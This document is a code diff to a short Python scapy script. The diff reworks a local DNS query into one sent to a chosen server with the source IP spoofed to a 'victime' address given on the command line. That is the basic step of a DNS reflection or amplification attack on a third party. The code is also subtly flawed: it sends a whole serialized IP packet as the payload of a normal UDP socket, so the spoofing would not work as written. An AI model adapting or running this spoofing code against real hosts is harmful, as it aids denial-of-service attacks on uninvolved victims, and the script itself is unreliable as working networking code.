@@ -1,14 +1,20 @@
 from scapy.all import *
 
+import sys
+
 import socket
+
+server_ip = sys.argv[1]
+
+victime_ip = sys.argv[2]
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
-packet = IP(dst='127.0.0.1') / UDP(dport=53) / DNS(id=12, qd=DNSQR(qname='youtube.com', qtype='TXT'))
+packet = IP(dst=server_ip, src=victime_ip) / UDP(dport=53, sport=5530) / DNS(id=12, qd=DNSQR(qname='twitter.com', qtype='A'))
 
-sock.sendto(raw(packet), ('127.0.0.1', 53))
+sock.sendto(raw(packet), (server_ip, 53))
 
-data, address = sock.recvfrom(512)
+data, address = sock.recvfrom(1024)
 
 data = raw(data)
 
